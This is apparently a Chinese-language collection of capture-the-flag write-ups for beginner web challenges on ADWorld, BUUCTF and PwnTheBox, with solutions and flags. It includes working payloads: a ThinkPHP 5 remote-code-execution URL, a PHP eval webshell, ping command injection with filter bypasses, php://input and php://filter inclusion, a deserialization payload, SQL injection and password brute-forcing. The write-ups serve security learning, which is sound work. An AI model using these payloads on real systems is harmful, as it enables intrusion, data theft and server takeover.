# Web

## ADWorld

### [view_source](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5061)

直接`view-source:http://111.200.241.244:58282/`即可查看源码发现鼠标右键菜单被禁用啦。当然你也可以尝试`F12`。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Where is the FLAG</title>
</head>
<body>
<script>
document.oncontextmenu=new Function("return false")
document.onselectstart=new Function("return false")
</script>
<h1>FLAG is not here</h1>
<!-- cyberpeace{0ecea0641057535f961556bb4c0e3bd0} -->
</body>
</html>
```

------

### [robots](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5063)

`dirsearch -u http://111.200.241.244:60105/`扫描靶机发现网站目录下有个名为`robots.txt`的文件。

![](https://paper.tanyaodan.com/ADWorld/web/5063/1.png)

访问`http://111.200.241.244:60105/robots.txt`后发现另一个文件`f1ag_1s_h3re.php`。

![](https://paper.tanyaodan.com/ADWorld/web/5063/2.png)

访问`http://111.200.241.244:60105/f1ag_1s_h3re.php`后得到`cyberpeace{4a262386808d63cf055543bc2caea780}`。

![](https://paper.tanyaodan.com/ADWorld/web/5063/3.png)

------

### [backup](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5064)

`dirsearch -u http://111.200.241.244:55833/`扫描靶机发现网站目录下有个名为`index.php.bak`的文件。

![](https://paper.tanyaodan.com/ADWorld/web/5064/1.png)

将`index.php.bak`文件下载后用`Sublime Text`打开即可得到`Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}`。

![](https://paper.tanyaodan.com/ADWorld/web/5064/2.png)

------

### [cookie](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5065)

打开靶机后可以看到一行信息：`你知道什么是cookie吗？`用`Burp Suite`抓包后`Send to Repeater`，接着再`Send Request`即可在右侧的`Response`中看到`flag`：`cyberpeace{b40aedb023a3f5e8139db61290274fd5}`。

![](https://paper.tanyaodan.com/ADWorld/web/5065/1.png)

------

### [disabled_button](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5066)

`view-source:http://111.200.241.244:63058/`查看网页源码如下：

```html
<html>
<head>
    <meta charset="UTF-8">
    <title>一个不能按的按钮</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>一个不能按的按钮</h3>
<form action="" method="post" >
<input disabled class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth" />
</form>
</body>
</html>
```

`F12`检查按钮将`<input>`标签中的`disabled`删除掉，再点击按钮即可得到`cyberpeace{84636369beba359c6f1e0d9f304a9a6d}`。

------

### [weak_auth](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5069)

打开靶机后随便输入账号密码便会提示账号应该是`admin`。用`Burp Suite`抓包后`Send to Intruder`，在`Payload Positions`中设置`Attack type`为`Sniper`，并添加`username=admin & password=§1§`，在`Payload Set`中添加字典进行爆破，最后得到密码为`123456`。在靶机中输入账号`admin`和密码`123456`即可得到`cyberpeace{a4f2ecbfdcd552b9eb8c7a920c604556}`。

------

### [simple_php](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5072)

`PHP`代码审计题。靶机中给出的`PHP`代码如下，我直接在源码中写注释啦：

```php
<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
if($a==0 and $a){  //同时满足$a==0和$a时显示flag1
    echo $flag1;
}
if(is_numeric($b)){ //
    exit();
}
if($b>1234){
    echo $flag2;
}
?>
```

由于`PHP`是弱类型语言，所以当`$a=fuck`时`'fuck'==0`为真，可以得到`flag1`。`is_numeric()`函数用于判断变量是否为数字或数字字符串，是则返回`true`，否则返回`FALSE`，当`$b=6666r`时`is_numeric($b)`会返回真并且`'6666r'>1234`为真，从而得到`flag2`，因此直接访问`http://111.200.241.244:56134/?a=fuck&b=6666r`就能得到`Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}`。

![](https://paper.tanyaodan.com/ADWorld/web/5072/1.png)

------

### [get_post](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5062)

访问靶机可以看到：`请用GET方式提交一个名为a,值为1的变量`，访问`http://111.200.241.244:55979/?a=1`可以看到`请再以POST方式随便提交一个名为b,值为2的变量`，`F12`用`HackBar`来添加`POST`请求数据`b=2`即可得到`cyberpeace{5c2ef3d86768127bbaccfc5cb2eb143d}`。

![](https://paper.tanyaodan.com/ADWorld/web/5062/1.png)

------

### [xff_referer](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5068)

访问靶机看到提示`ip地址必须为123.123.123.123`，打开`Burp Suite`抓包，添加`X-Forwarded-For: 123.123.123.123`后`send Request`看到提示`必须来自https://www.google.com`，继续添加`Referer: https://www.google.com`即可在`Response`中看到`cyberpeace{da1117a6b680354278869a08c728e227}`。

------

### [webshell](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5070)

打开靶机看到以下信息：

```php+HTML
你会使用webshell吗？
<?php @eval($_POST['shell']);?>
```

打开`AntSword`挥动俺的蚁剑，一句话木马告诉了靶机的连接密码是`shell`，连接成功后可以看到`flag.txt`文件，查看后即可得到`cyberpeace{081245a68c219586f459156b3d8c7051}`。

![](https://paper.tanyaodan.com/ADWorld/web/5070/1.png)

------

### [command_execution](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5071)

先来简单了解一下`Command`的四种执行方式：

```
command1 & command2 ：不管command1执行成功与否，都会执行command2，并且将上一个命令的输出作为下一个命令的输入
command1 && command2 ：先执行command1执行成功后才会执行command2，若command1执行失败，则不执行command2
command1 | command2 ：只执行command2
command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2)
```

然后这一题只需要无脑爆破就完事了，输入`127.0.0.1 | ls`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | ls
index.php
```

显然网站目录下并没有`flag`相关文件，输入`127.0.0.1 | ls /`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | ls /
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
run.sh
sbin
srv
sys
tmp
usr
var
```

首先访问`home`来查看有无`flag`相关信息，输入`127.0.0.1 | ls /home`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | ls /home
flag.txt
```

好家伙！果断输入`127.0.0.1 | cat /home/flag.txt`后点击`PING`发现回显如下：

```bash
ping -c 3 127.0.0.1 | cat /home/flag.txt
cyberpeace{a3da29df7d0cd9ad500448f96ea9159b}
```

提交`cyberpeace{a3da29df7d0cd9ad500448f96ea9159b}`即可。

------

### [simple_js](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5067)

关闭弹出来的输入框，查看靶机源码如下：

```html
<html>
<head>
    <title>JS</title>
    <script type="text/javascript">
    function dechiffre(pass_enc){
        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
        var tab  = pass_enc.split(',');
                var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;
                        k = j + (l) + (n=0);
                        n = tab2.length;
                        for(i = (o=0); i < (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
                                if(i == 5)break;}
                        for(i = (o=0); i < (k = j = n); i++ ){
                        o = tab[i-l];
                                if(i > 5 && i < k-1)
                                        p += String.fromCharCode((o = tab2[i]));
                        }
        p += String.fromCharCode(tab2[17]);
        pass = p;return pass;
    }
    String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));
    h = window.prompt('Enter password');
    alert( dechiffre(h) );
</script>
</head>
</html>
```

编写`Python`代码来解码那一串字符串，从而得到`Cyberpeace{786OsErtk12}`。

```python
s = '\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30'
l = s.split(',')
flag = ''
for x in l:
    flag += chr(int(x))
flag = 'Cyberpeace{%s}'%flag
print(flag)  #Cyberpeace{786OsErtk12}
```

------

### [baby_web](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5411)

题目描述：`想想初始页面是哪个`。然而直接访问靶机`/index.php`会被重定向到`1.php`，那不好意思，那我只能`Burp Suite`抓包了，`Send to Repeater`后`Send Request`即可在`Response`中的`HTTP`头中看到`flag{very_baby_web}`。

![](https://paper.tanyaodan.com/ADWorld/web/5411/1.png)

------

### [Training-WWW-Robots](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4748)

靶机中给出的信息如下：

```html
In this little training challenge, you are going to learn about the Robots_exclusion_standard.
The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.
Sometimes these files reveal the directory structure instead protecting the content from being crawled.

Enjoy!
```

直接访问`http://111.200.241.244:49579/robots.txt`，可以看到以下信息：

```html
User-agent: *
Disallow: /fl0g.php

User-agent: Yandex
Disallow: *
```

访问`http://111.200.241.244:49579/fl0g.php`即可拿到`cyberpeace{abe0ddcfd221dc9db56b6551842a5fa0}`。

------

### [php_rce](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5412)

这是一个远程代码执行漏洞。访问`http://111.200.241.244:62916/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`时可以成功执行`phpinfo`。访问`http://111.200.241.244:62916/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`可以看到网站的文件目录，不过并没有`flag`信息。访问`http://111.200.241.244:62916/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20/`可以看到靶机服务器的根目录下有一个`flag`文件，好家伙！访问`http://111.200.241.244:62916/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag`即可得到`flag{thinkphp5_rce}`。

------

### [Web_php_include](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415)

根据靶机给出的`PHP`源码信息可知page传参`php://`会被过滤掉，不过`strstr()`函数用于查找字符串首次出现的位置，`str_replace()`函数用来替换目标字符，这两个函数都是区分大小写字母的，因此我们可以用`PHP://`来绕开这个过滤。

```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

用`Burp Suite`抓包`http://111.200.241.244:56744/?page=PHP://input`添加`<?php system("ls"); ?>`即可在靶机执行`ls`命令。

![](https://paper.tanyaodan.com/ADWorld/web/5415/1.png)

可以看到网站目录下有个`fl4gisisish3r3.php`，如果直接访问的话没用，需要用`<?php system("cat fl4gisisish3r3.php"); ?>`在靶机执行`cat fl4gisisish3r3.php`命令才能得到`ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}`。

![](https://paper.tanyaodan.com/ADWorld/web/5415/2.png)

------

### [PHP2](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4820)

`dirsearch -u http://111.200.241.244:57993/`扫描网站目录发现有个名为`index.phps`的文件。

![](https://paper.tanyaodan.com/ADWorld/web/4820/1.png)

访问`http://111.200.241.244:57993/index.phps`发现代码如下：

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```

首先要让`"admin"===$_GET[id]`这个判断条件不成立，我们可以对`admin`进行`url`编码，当然也可以对其中一个字母`a`进行`url`编码，得到`%61dmin`，因为在访问链接时，会进行一次`url`解码，所以还需要对`%61dmin`再进行一次`url`编码得到`%2561dmin`，而`%25`在经过一次`url`解码后就是`%`，所以访问`http://111.200.241.244:57993/index.php?id=%2561dmin`即可得到`cyberpeace{58ce43c6c7b89495d5dcc2a10e87aa11}`。

------

## BUUCTF

### [[ACTF2020 新生赛]Include](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include)

加上`?file=php://filter/read=convert.base64-encode/resource=flag.php`，可以得到一串base64加密的数据`PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ODc4ZjlkODEtZTY0NC00Njk4LWIzOGYtYjBiZTRlZjk5NzljfQo=`，解码就可以得到如下数据：

```php
<?php
echo "Can you find out the flag?";
//flag{878f9d81-e644-4698-b38f-b0be4ef9979c}
```

### [[极客大挑战 2019]Http](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)

##### 解法1：BurpSuite

直接`view-source:http://node4.buuoj.cn:25280/`查看源码，可以找到这样一段代码：

```html
<div class="content">
  <h2>小组简介</h2>
  <p>·成立时间：2005年3月<br /><br />
     ·研究领域：渗透测试、逆向工程、密码学、IoT硬件安全、移动安全、安全编程、二进制漏洞挖掘利用等安全技术<br /><br />
     ·小组的愿望：致力于成为国内实力强劲和拥有广泛影响力的安全研究团队，为广大的在校同学营造一个良好的信息安全技术
     <a style="border:none;cursor:default;" onclick="return false" href="Secret.php">氛围</a>！
  </p>
</div>
```

点击`Secret.php`可以看到一行很大的文字`It doesn't come from 'https://www.Sycsecret.com'`。

`BurpSuite`抓包新增`Referer:www.Sycsecret.com`后又出现了一行新的文字，`Please use "Syclover" browser`。

继续用`BurpSuite`将`User-Agent`修改为 `Syclover`后又出现了一行新的文字`No!!! you can only read this locally!!!`。

用`BurpSuite`添加`X-Forwarded-For:127.0.0.1`后可以拿到`flag`。

##### 解法2：Golang

```go
package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func httpRequest(url string) (*http.Response, error) {
	request, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	request.Header.Add("Referer", "https://www.Sycsecret.com")
	request.Header.Add("User-Agent", "Syclover")
	request.Header.Add("X-Forwarded-For", "127.0.0.1")
	client := http.Client{}
	return client.Do(request)
}

func main() {
	response, err := httpRequest("http://node4.buuoj.cn:25280/Secret.php")
	if err != nil {
		fmt.Printf("http get error: %s", err)
		return
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Printf("read error: %s", err)
	}
	fmt.Println(string(body))
}
```

##### 解法3：Python

```python
import requests
url = 'http://node4.buuoj.cn:25280/Secret.php'
headers={"Referer":"https://www.Sycsecret.com","Origin":"https://www.Sycsecret.com"}
headers['User-Agent'] = "Syclover"
headers['X-Forwarded-For'] = '127.0.0.1'
r = requests.get(url,headers=headers)
with open("1.html",'w') as f:
    f.write(r.text)
```

输出的`html`页面如下，可以看到`flag`：

```html
<!DOCTYPE html>
<html>

<style>
    .slickButton3 {
        margin-right:20px;
        margin-left:20px;
        margin-top:20px;
        margin-bottom:20px;
        color: white;
        font-weight: bold;
        padding: 10px;
        border: solid 1px black;
        background: #111111;
        cursor: pointer;
        transition: box-shadow 0.5s;
        -webkit-transition: box-shadow 0.5s;
    }

    .slickButton3:hover {
        box-shadow:4px 4px 8px #00FFFF;
    }
    img {
        position:absolute;
        left:20px;
        top:0px;
    }
    p {
        cursor: default;
    }
    .input{
        border: 1px solid #ccc;
        padding: 7px 0px;
        border-radius: 3px;
        padding-left:5px;
        -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
        box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
        -webkit-transition: border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;
        -o-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
        transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s
    }
    .input:hover{
        border-color: #808000;
        box-shadow: 0px 0px 8px #7CFC00;
    }  
</style>

<head>
        <meta charset="UTF-8">
        <title>SycSecret</title>
</head>
<body background="./images/background.png" style="background-repeat:no-repeat ;background-size:100% 100%; background-attachment: fixed;" >

</br></br></br></br></br></br></br></br></br></br></br></br>
<h1 style="font-family:arial;color:#8E44AD;font-size:50px;text-align:center;font-family:KaiTi;">
flag{2f1ec631-f839-4d42-8413-b790506989a7}
</h1>
<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
</body>
</html>
```

------

### [[GXYCTF2019]Ping Ping Ping](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)

靶机给出的信息如下：

```
/?ip=
```

访问`/?ip=127.0.0.1`测试一下可以看到以下信息：

```bash
PING 127.0.0.1 (127.0.0.1): 56 data bytes
```

这是`Linux`命令执行，尝试使用管道符 `|` 来用`ls`显示当前目录的所有文件，访问`/?ip=127.0.0.1|ls`可以看到如下信息：

```
/?ip=
flag.php
index.php
```

直接`/?ip=127.0.0.1|cat flag.php`企图拿到`flag`，结果实际访问的是`/?ip=127.0.0.1|cat%20flag.php`，看到了如下信息：

```
/?ip= fxck your space!
```

艹被骂了，查阅资料后看到了一些输入空格的方法：

> $IFS	  //在这道题里不知道为什么不行
> ${IFS}
> $IFS$1 //$1改成$加其他数字都行
> < 
> <> 
> {cat,flag.php}  //用逗号实现了空格功能
> %20 
> %09 

访问`/?ip=127.0.0.1|cat$IFS$1flag.php`再次查看还是被骂，那看看另一个文件，`/?ip=127.0.0.1|cat$IFS$1index.php`，可以看到以下信息：

```php
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```

这怎么显示得不全？！`view-source`查看源码可以看到以下信息：

```php
/?ip=
<pre>/?ip=
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

利用变量拼接绕过，可以拿到`flag`。

```
view-source:81def8b2-1bd9-4d67-9e1c-9f6b395b6b18.node4.buuoj.cn:81/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```

看到一个大佬的解法：使用反引号`` 代替 | 内联执行，，将反引号内命令的输出作为输入执行，即把ls的结果作为cat的参数进行执行。

```
view-source:http://81def8b2-1bd9-4d67-9e1c-9f6b395b6b18.node4.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$1`ls`
```

------

### [BUU CODE REVIEW 1](https://buuoj.cn/challenges#BUU%20CODE%20REVIEW%201)

靶机给出的`PHP`代码如下：

```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */
highlight_file(__FILE__);
class BUU {
   public $correct = "";
   public $input = "";
   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```

`GET`提交：`?pleaseget=1`，用`Hackbar`来提交`POST`数据`pleasepost=2&md51=s878926199a&md52=s155964671a`。

编写`PHP`代码获得`obj`的数据：

```php
<?php
class BUU{
    public $correct = "";
    public $input = "";
}
$chen = new BUU();
$chen->input=&$chen->correct;
$chen = serialize($chen);
echo $chen."<br />";
//O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
```

访问`http://453330ed-2554-4984-8840-0b67be1cca69.node4.buuoj.cn:81/?pleaseget=1`并用`Hackbar`来提交`POST`数据`pleasepost=2&md51=s878926199a&md52=s155964671a&obj=O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}`，从而得到`flag{da006ff2-25a4-42d3-9735-ce27b5ad4dfc}`。

![](https://paper.tanyaodan.com/BUUCTF/buu_code_review/1.png)

------

### [[ACTF2020 新生赛]BackupFile](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]BackupFile)

用`dirsearch`扫描靶机发现有个名为`index.php.bak`的文件，下载后用`Sublime Text`打开代码审计：

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

`is_numeric()`函数限制了`GET`请求传入的`key`只能是数字。在`PHP`中`==`是弱类型比较，比如数字与字符串比较时，会将字符串里的数字传换成`int`，用这部分去比较，所以我们只需传入`key=123`即可得到`flag{994014a0-3bb5-4bbf-a69b-ac087e72ee59}`。

------

### [[第一章 web入门]常见的搜集](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E5%B8%B8%E8%A7%81%E7%9A%84%E6%90%9C%E9%9B%86)

`dirsearch`扫描靶机，发现有3个文件：`robots.txt`，`index.php~`，`./index.php.swp`

名为`robots.txt`的文件，访问后看到如下信息：

```php
User-agent: *
Disallow:
/flag1_is_her3_fun.txt
```

访问`flag1_is_her3_fun.txt`得到`flag1:n1book{info_1`。此外还有一个名为`index.php~`的文件，访问后得到`flag2:s_v3ry_im`。

下载`./index.php.swp`后在`Kali Linux`系统的`Terminal`输入`vim -r index.php.swp`即可看到源代码中有`flag3:p0rtant_hack}`。

提交`n1book{info_1s_v3ry_imp0rtant_hack}`即可。

------

### HTTP

进入靶机后看到：

> Please `GET` me your `name`,I will tell you more things.

靶机`?name=Dad`

> Hello,Dad. Please `POST` me the `key` Again.But Where is the key?

可以在源码中看到<!--Key: ctfisgood-->，`Harkbar`构造`POST`请求，添加`key=ctfisgood`。

> You are smart but you are not `admin`.

`Burpsuite Pro`抓包，修改`Cookie`中的`guest`为`admin`，`send Repeater`以下内容：

```
POST /?name=flag HTTP/1.1
Host: 6059b011-9e32-43f1-8a4d-41a07b7bed8d.node4.buuoj.cn:81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: user=admin
Connection: close
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

key=ctfisgood
```

可以在`Response`中看到以下信息：

```
HTTP/1.1 200 OK
Server: openresty
Date: Sat, 24 Sep 2022 04:09:24 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 74
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.3.15

<h1>OK, this is you want: flag{e695e63d-0489-4708-8695-730e7966731b}
</h1>
```

提交`flag{e695e63d-0489-4708-8695-730e7966731b}`即可。

------

### Head?Header!

进入靶机后看到：

> Must Use `CTF` Brower!

`Harkbar`添加`Request header`，`Name`为`User-Agent`，`Value`为`CTF`，勾选刷新页面。

> Must From `ctf.com`

`Harkbar`添加`Request header`，`Name`为`Referer`，`Value`为`ctf.com`，勾选刷新页面。

> Only Local User Can Get Flag

`Harkbar`添加`Request header`，`Name`为`X-Forwarded-For`，`Value`为`127.0.0.1`，勾选刷新页面。

> You Are Good,This is your flag: flag{af1b7bd5-ae50-4b7f-85f1-790ffc7f244a}

提交`flag{af1b7bd5-ae50-4b7f-85f1-790ffc7f244a}`即可。

------

### 我真的会谢

进入靶机后看到：

> **Flag has three part, qsdz hid them in different files.**
> **By the way, these files are sensitive.**

查看源码发现注释<!--I used VIM to write this file, but some errors occurred midway.--> 根据注释想到`vim`非正常退出的话会留下`swp`文件，访问靶机`/.index.php.swp`，可以下载该文件。`vim -r index.php.swp`可以看到以下内容：

```php
<?php
echo "<br><h1<flag has three part, qsdz hid them in different files.By the way, these files are sensitive.</h1><!--I used VIM to write this file, but some errors occurred midway.-->";
#This is my secret
$Part_two = "0_e4sy_d0_y00";
```

还有两段`flag`未知，`dirsearch`扫描靶机目录，发现`robots.txt`和`www.zip`。访问靶机`/robots.txt`，可以看到：

> Part One: flag{Th1s_Is_s00

访问靶机`/www.zip`，解压缩可得文件`secret`，内容如下：

> Part Three: u_th1nk_so?}

将三部分拼接可得`flag{Th1s_Is_s000_e4sy_d0_y00u_th1nk_so?}`，提交即可。

------

### NotPHP

访问靶机，内容如下：

```php+HTML
<?php
error_reporting(0);
highlight_file(__FILE__);
if(file_get_contents($_GET['data']) == "Welcome to CTF"){
    if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2']){
        if(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077){
            echo "Hack Me";
            eval("#".$_GET['cmd']);
        }else{
            die("Number error!");
        }
    }else{
        die("Wrong Key!");
    }
}else{
    die("Pass it!");
} Pass it!
```

代码审计可知`GET`请求传递的`data`值等于`"Welcome to CTF"`。直接赋值失败，`base64`编码可得`V2VsY29tZSB0byBDVEY=`，可以通过伪协议构造`"Welcome to CTF"`，访问靶机`/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=`，看到`Wrong Key!`说明已经绕过了`file_get_contents($_GET['data']) == "Welcome to CTF"`这个判断条件。

接着看第二个判断条件，`key1`和`key2`的值不相等，但是`md5()`加密后的值相等，可以通过传递数组来实现`key1[]=1&key2[]=6`。访问靶机`/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&key1[]=1&key2[]=6`，看到`Number error!`说明已绕过第二层。

第三个判断条件有两个函数`is_numeric()`和`intval()`，其中`is_numeric()`用来判断是否为纯数字，若有字符则为假。`intval()`用于获取变量的整数值。所以`POST`请求传递`num`的值为`2077s`即可绕过，看到`Hack Me`。执行`cmd=system('cat /flag');`失败，这是因为`eval("#".$_GET['cmd']);`有个`#`号，需要闭合才能执行后面的变量。

访问靶机`/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&key1[]=1&key2[]=6&cmd=?><?=system('cat /flag');`，得到`flag{7964f17b-08ce-4a70-9402-941354e8ac26}`。

------

### Word-For-You

题目描述如下：

> 赛博顶针先生悄悄把flag告诉了Mr.H，Mr.H为了确保安全把flag放到了数据库中，你能找到吗？

这题考察点应该是`SQL`注入，`1'or 1=1#`拿下`flag{Th1s_is_0_simp1e_S0L_test}`。

------

## PwnTheBox

### [XSS](https://ce.pwnthebox.com/challenges?type=5&id=673)

打开靶机后可以看到以下内容：

```php
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { echo '
' . $_GET[ 'name' ] . '
'; }
```

通过`GET` 请求获取了一个名为`name`的参数，并进行了输出。

直接访问`?name=flag`可以得到`flag`，提交`PTB{2baa079c-0d7b-45a3-92bc-8dbac59b56cc}`即可。

------

### [Get](https://ce.pwnthebox.com/challenges?type=5&id=657)

打开靶机后可以看到以下内容：

```php
$what=$_GET['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';

Notice: Undefined index: what in /var/www/html/index.php on line 8
```

通过`GET` 请求获取了一个名为`what`的参数，当满足`$what=='flag'`时即可输出`flag`。

直接访问 `?what=flag`可以得到`flag`，提交`PTB{58625de2-2456-401e-ac43-70bd9cdefb4b}`即可。

------

### [Post](https://ce.pwnthebox.com/challenges?type=5&id=661)

打开靶机后可以看到以下内容：

```php
$what=$_POST['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';
```

通过`POST` 请求获取了一个名为`what`的参数 ，当满足`$what=='flag'`时即可输出`flag`。

利用`HackBar`来构造`POST`请求，填入靶机`URL`后`Enable POST`，`enctype`默认为`application/x-www-form-urlencoded`，在`Body`处输入`what=flag`，点击`EXECUTE`即可得到`flag`，提交`PTB{ec5e177f-729b-4c5d-98e9-3cc1be6a8e11}`即可。

此外，这题还可以使用`curl`来发送`POST`请求，`-d`参数用于发送`POST`请求的数据内容。

```bash
curl -d "what=flag" -X POST 靶机地址
```

使用`-d`参数后，`HTTP`请求会自动加上标头`Content-Type: application/x-www-form-urlencoded`，并自动将请求抓为`POST`方式，因此可以省略`-X POST`，直接写为：

```bash
curl -d "what=flag" 靶机地址
```

------

